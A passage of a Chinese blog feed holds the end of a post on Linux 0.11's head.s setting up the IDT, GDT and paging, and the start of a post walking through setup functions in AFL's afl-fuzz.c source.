edi,8</span><br><span class="line">    dec ecx</span><br><span class="line">    jne rp_sidt</span><br><span class="line">    lidt fword ptr idt_descr</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">idt_descr:</span><br><span class="line">    dw 256*8-1</span><br><span class="line">    dd _idt</span><br><span class="line"></span><br><span class="line">_idt:</span><br><span class="line">    DQ 256 dup(0)</span><br></pre></td></tr></table></figure><p>这段代码的作用就是，设置了 256 个中断描述符，每个中断描述符都指向 ignore_int 的函数地址，ignore_int 是一个默认的中断处理程序，之后会被具体的中断程序覆盖。就比如你现在敲键盘是没什么反应的，因为键盘模块的中断程序还没覆盖掉它，任何中断都是调用 ignore_int 程序。</p><p>setup_gdt 也是同理就不多说了，直接看设置好了的结果吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_gdt:</span><br><span class="line">    DQ 0000000000000000h    ;&#x2F;* NULL descriptor *&#x2F;</span><br><span class="line">    DQ 00c09a0000000fffh    ;&#x2F;* 16Mb *&#x2F;</span><br><span class="line">    DQ 00c0920000000fffh    ;&#x2F;* 16Mb *&#x2F;</span><br><span class="line">    DQ 0000000000000000h    ;&#x2F;* TEMPORARY - don&#39;t use *&#x2F;</span><br><span class="line">    DQ 252 dup(0)</span><br></pre></td></tr></table></figure><p>其实和之前设置的一样，也还是有代码段描述符和数据段描述符这些。</p><p>为什么之前设置过了现在又要设置一遍呢？</p><p>是因为之前设置的 gdt 所处的 setup 程序中，之后会被缓冲区覆盖，所以要重新给它挪个位置，挪到head。然后结果就变成了这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387246607465/6b16f29d296cea9397cf242496a6275af8ba2ef7.png" alt="640 (1)"></p><p>总结一下之前说的就是，把 idt 和 gdt 移位，其中 idt 方面给每个中断设置了一个默认中断程序 ignore_int，gdt 方面没有太多变化。</p><hr><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jmp after_page_tables</span><br><span class="line">...</span><br><span class="line">after_page_tables:</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push L6</span><br><span class="line">    push _main</span><br><span class="line">    jmp setup_paging</span><br><span class="line">L6:</span><br><span class="line">    jmp L6</span><br></pre></td></tr></table></figure><p>这就是开启分页机制，并且跳转到 main 函数。</p><p>先来看看什么叫分页机制。</p><p>还记不记得，在保护模式下，我们在代码中给出一个内存地址，要经过分段机制的转换，才变成最终物理地址。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387713365211/883583318ae1286e5027b74d8feedd0eaf6091c9.png" alt="640 (2)"></p><p>开了分页机制后，就多了一步转换</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387799526623/607473eb2b9535abba2b66def59b1b8add5d4c2b.png" alt="640 (3)"></p><p>也就是说，在没有开启分页机制时，程序员给出的逻辑地址，通过分段机制转换成物理地址；</p><p>开启分页机制后，逻辑地址<strong>仍然要通过分段机制进行转化</strong>，但是这个时候得到的是<strong>线性地址</strong>，再通过一次<strong>分页机制转换</strong>，才得到最终的物理地址。</p><p>分页地址是如何转换的呢？</p><p>比如给出一个线性地址 15M ，二进制表示就是 0000000011_0100000000_000000000000</p><p>整个过程：(个人感觉应该是 13 M)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387860825455/c64b56c662e33a389d175d046ac504d16f73d7b8.png" alt="640 (4)"></p><p>也就是说，线性地址会被拆成 <strong>高 10 位：中间 10 位：后 12 位</strong></p><p>高 10 位负责在<strong>页目录表</strong>中找到一个<strong>页目录项</strong>，中间 10 位再去该页目录项中找到相应的<strong>页表项</strong>，这个页表项的值，再加上后 12 位的偏移地址，得到最终的物理地址。(由内存管理单元MMU负责)</p><p>浅看一下页目录项和页表项的结构：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649388035415663/497437165bd4765e3191234a6abf74af7cac22a3.png" alt="640 (5)"></p><p>当我们开启分页机制的开关，只需要更改 cr0 寄存器的一位即可，和之前开保护模式差不多</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649417482942435/05ebe1114ddafd78cdfb17b16c2d8d6332d7ba4a.png" alt="640"></p><p>所以之前的那段代码，就是<strong>帮我们把页表和页目录存在内存中</strong>，然后<strong>开启</strong> <strong>cr0</strong> <strong>寄存器的分页开关</strong>。再粘出来看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">setup_paging:</span><br><span class="line">    mov ecx,1024*5</span><br><span class="line">    xor eax,eax</span><br><span class="line">    xor edi,edi</span><br><span class="line">    pushf</span><br><span class="line">    cld</span><br><span class="line">    rep stosd</span><br><span class="line">    mov eax,_pg_dir</span><br><span class="line">    mov [eax],pg0+7</span><br><span class="line">    mov [eax+4],pg1+7</span><br><span class="line">    mov [eax+8],pg2+7</span><br><span class="line">    mov [eax+12],pg3+7</span><br><span class="line">    mov edi,pg3+4092</span><br><span class="line">    mov eax,00fff007h</span><br><span class="line">    std</span><br><span class="line">L3: stosd</span><br><span class="line">    sub eax,00001000h</span><br><span class="line">    jge L3</span><br><span class="line">    popf</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov cr3,eax</span><br><span class="line">    mov eax,cr0</span><br><span class="line">    or  eax,80000000h</span><br><span class="line">    mov cr0,eax</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>这段代码会产生什么效果呢？</p><p>当时 linux-0.11 认为，总共可以使用的内存不会超过 16M，即最大地址空间为 0xFFFFFF。</p><p>而对应分页机制，1 个页目录表最多包含 1024 个页目录项(页表)，1 个页目录项最多包含 1024 个页表项(页)，1 个页表项位 4 kb(因为偏移有 12 位)，所以 16 M 的地址空间可以用 1 个页目录表 + 4 个页表搞定：<code>4（页表数）* 1024（页表项数） * 4KB（一页大小）= 16MB</code></p><p>所以，上面这段代码，会将页目录表放在内存地址的最开头，也就是 head.s 的最开头的 <code>_pg_dir</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_pg_dir:</span><br><span class="line">.globl startup_32</span><br><span class="line">_startup_32:</span><br><span class="line">    mov eax,0x10</span><br><span class="line">    mov ds,ax</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>之后紧挨着这个页目录表，放置 4 个页表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.org 0x1000 pg0:</span><br><span class="line">.org 0x2000 pg1:</span><br><span class="line">.org 0x3000 pg2:</span><br><span class="line">.org 0x4000 pg3:</span><br><span class="line">.org 0x5000</span><br></pre></td></tr></table></figure><p>最终布局如下：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649418882843397/780dd6c4bbcae3d90983285c459a4c1460fe3d34.png" alt="640 (1)"></p><p>同 idt 和 gdt 一样，我们需要告诉 CPU 这些页表存在了什么地方，通过下面这个代码实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">mov cr3,eax</span><br></pre></td></tr></table></figure><p>将 cr3 赋为0，0 地址处就是页目录表。</p><p>现在，看一下整个内存的布局是什么样的：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649418969404186/e9a9bc8dbd50889b004df4c07e368e5a4a5d90e6.png" alt="640 (2)"></p><p>页表设置好了，我们再来看看内存是怎样映射的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setup_paging:</span><br><span class="line">    ...</span><br><span class="line">    mov eax,_pg_dir</span><br><span class="line">    mov [eax],pg0+7</span><br><span class="line">    mov [eax+4],pg1+7</span><br><span class="line">    mov [eax+8],pg2+7</span><br><span class="line">    mov [eax+12],pg3+7</span><br><span class="line">    mov edi,pg3+4092</span><br><span class="line">    mov eax,00fff007h</span><br><span class="line">    std</span><br><span class="line">L3: stosd</span><br><span class="line">    sub eax, 1000h</span><br><span class="line">    jpe L3</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>前 5 行，以第 2 行为例，[eax]被赋为 pg0+7，也就是 0x1007，页表地址为 0x1000，页属性为 0x07 表示改页存在、用户可读写。</p><p>后面几行表示，填充 4 个页表的每一项，一共 4 * 1024 = 4096 项，依次映射到内存的前 16MB 空间。</p><p>经过这套分页机制，线性地址将恰好和最终转换的物理地址一样。</p><p>也就是如下图的效果：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387860825455/c64b56c662e33a389d175d046ac504d16f73d7b8.png" alt="640 (4)"></p><p>至今为止，该设置的什么 idt、gdt、页表都设置好了，也开启了保护模式，之后就正式进入 main.c 了。</p><hr><p>正式进入 main.c 还是有一个过程的，现在来讲一下这个过程。</p><p>main.c 是怎么被执行的呢？还是要回去看一下 head.s，设置分页的那个地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">after_page_tables:</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push L6</span><br><span class="line">    push _main</span><br><span class="line">    jmp setup_paging</span><br><span class="line">...</span><br><span class="line">setup_paging:</span><br><span class="line">    ...</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>进行五次压栈，然后跳到 setup_paging，注意 setup_paging 函数最后有一个 ret 指令，会将栈顶的元素值当作返回地址(将esp赋值给eip)，然后跳转过去。</p><p>整个栈结构如下：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649419637391002/a3361bab535cc3bc4f325cf7934ac5bc5400a590.png" alt="640 (3)"></p><p>L6 作为 main 函数的返回地址，三个 0 作为 main 函数的参数，都不用太关心。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL源码分析之afl-fuzz.c</title>
      <link href="/2022/03/08/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bafl-fuzz-c/"/>
      <url>/2022/03/08/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bafl-fuzz-c/</url>
      
        <content type="html"><![CDATA[<p>  作为 AFL  中最重要的一个部分，也就是 fuzzer 实现的关键步骤。因为篇幅太长，会将源码分成好几个模块来介绍</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>gettimeofday() 用来获取当前准确时间，接着用 srandom 根据当前时间与当前进程异或之后获取随机种子。</p><p>getopt() 函数读取参数并作出相应处理。</p><h2 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers()"></a>setup_signal_handlers()</h2><p>调用<code>sigaction</code>，设置信号处理函数</p><table><thead><tr><th align="left">信号</th><th>作用</th></tr></thead><tbody><tr><td align="left">SIGHUP/SIGINT/SIGTERM</td><td>处理各种“stop”情况</td></tr><tr><td align="left">SIGALRM</td><td>处理超时的情况</td></tr><tr><td align="left">SIGWINCH</td><td>处理窗口大小</td></tr><tr><td align="left">SIGUSER1</td><td>用户自定义信号，这里定义为skip request</td></tr><tr><td align="left">SIGSTP/SIGPIPE</td><td>不是很重要的一些信号，可以不用关心</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//创建sigaction结构体变量sa</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART;</span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  sigemptyset(&amp;sa.sa_mask);<span class="comment">//初始化mask为空</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Various ways of saying &quot;stop&quot;. */</span></span><br><span class="line">  <span class="comment">/*&#x27;stop&#x27;情况的处理*/</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_stop_sig;</span><br><span class="line">  sigaction(SIGHUP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  sigaction(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  sigaction(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exec timeout notifications. */</span></span><br><span class="line">  <span class="comment">/*超时情况的处理*/</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  sigaction(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Window resize */</span></span><br><span class="line">  <span class="comment">/*窗口大小的处理*/</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  sigaction(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* SIGUSR1: skip entry */</span></span><br><span class="line">  <span class="comment">/*自定义信号处理*/</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  sigaction(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Things we don&#x27;t care about. */</span></span><br><span class="line">  <span class="comment">/*一些不是很重要的信号的处理*/</span></span><br><span class="line">  </span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  sigaction(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  sigaction(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_stop_sig</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//设置stop_soon为1</span></span><br><span class="line">  stop_soon = <span class="number">1</span>; </span><br><span class="line">  <span class="comment">//child_pid存在，发送SIGKILL信号，从而被系统杀死</span></span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) kill(child_pid, SIGKILL);</span><br><span class="line">  <span class="comment">//forksrv_pid存在，同理</span></span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) kill(forksrv_pid, SIGKILL);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_timeout</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//如果child_pid存在</span></span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//设置child_timed_out为1，并kill掉child_pid</span></span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    kill(child_pid, SIGKILL);</span><br><span class="line">  <span class="comment">//如果child_pid不存在且forksrv_pid&gt;0</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child_pid == <span class="number">-1</span> &amp;&amp; forksrv_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//设置child_timed_out为1，并kill掉forksrv_pid</span></span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    kill(forksrv_pid, SIGKILL);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_resize</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  clear_screen = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_skipreq</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  skip_requested = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts()"></a>check_asan_opts()</h2><p>读取环境变量<code>ASAN_OPTIONS</code>和<code>MSAN_OPTIONS</code>，并做相应的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = getenv(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);<span class="comment">//读取ASAN_OPTIONS</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="comment">//检查abort_on_error是否为1，不为1报错</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="comment">//ASAN_OPTIONS情况</span></span><br><span class="line"></span><br><span class="line">  x = getenv(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);<span class="comment">//读取MSAN_OPTIONS</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="comment">//检查exit_code对应的状态码是否设置，没有报错</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR)))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            STRINGIFY(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line">    <span class="comment">//检查symbolize是否为0，没有报错</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="comment">//MSAN_OPTIONS情况</span></span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync()"></a>fix_up_sync()</h2><p>如果通过 <code>-M</code>或者<code>-S</code>指定了 <code>sync_id</code>，则更新 <code>out_dir</code> 和 <code>sync_dir</code> 的值：设置 <code>sync_dir</code> 的值为 <code>out_dir</code>，设置 <code>out_dir</code> 的值为<code>out_dir/sync_id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* x = sync_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)<span class="comment">////如果在设置dumb_mode模式，提示-S / -M参数与 -n参数互斥</span></span><br><span class="line">    FATAL(<span class="string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line">    <span class="comment">//如果force_deterministic已设置，检查参数是否互斥</span></span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      FATAL(<span class="string">&quot;use -S instead of -M -d&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      FATAL(<span class="string">&quot;-S already implies -d&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*x) &#123;</span><br><span class="line">    <span class="comment">//ID纠正</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">    x++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//sync_id过长报错</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>) FATAL(<span class="string">&quot;Fuzzer ID too long&quot;</span>);</span><br><span class="line"></span><br><span class="line">  x = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line">  <span class="comment">//更新sync_dir和out_dir的值</span></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  out_dir  = x;</span><br><span class="line">  <span class="comment">//如果force_deterministic没设置，赋值</span></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic) &#123;</span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline()"></a>save_cmdline()</h2><p>Copy 当前命令行参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_cmdline</span><span class="params">(u32 argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 len = <span class="number">1</span>, i;</span><br><span class="line">  u8* buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//遍历参数算出长度</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    len += <span class="built_in">strlen</span>(argv[i]) + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//为buf参数开辟存储空间</span></span><br><span class="line">  buf = orig_cmdline = ck_alloc(len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//将参数拷贝进buf</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++) &#123;</span><br><span class="line">    <span class="comment">//计算当前argv[i]长度</span></span><br><span class="line">    u32 l = <span class="built_in">strlen</span>(argv[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[i], l);</span><br><span class="line">    buf += l;</span><br><span class="line">    <span class="comment">//判断后面是否还有参数</span></span><br><span class="line">    <span class="keyword">if</span> (i != argc - <span class="number">1</span>) *(buf++) = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//结尾赋0</span></span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner()"></a>fix_up_banner()</h2><p>获取目标程序名称或程序路径或路径+省略号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 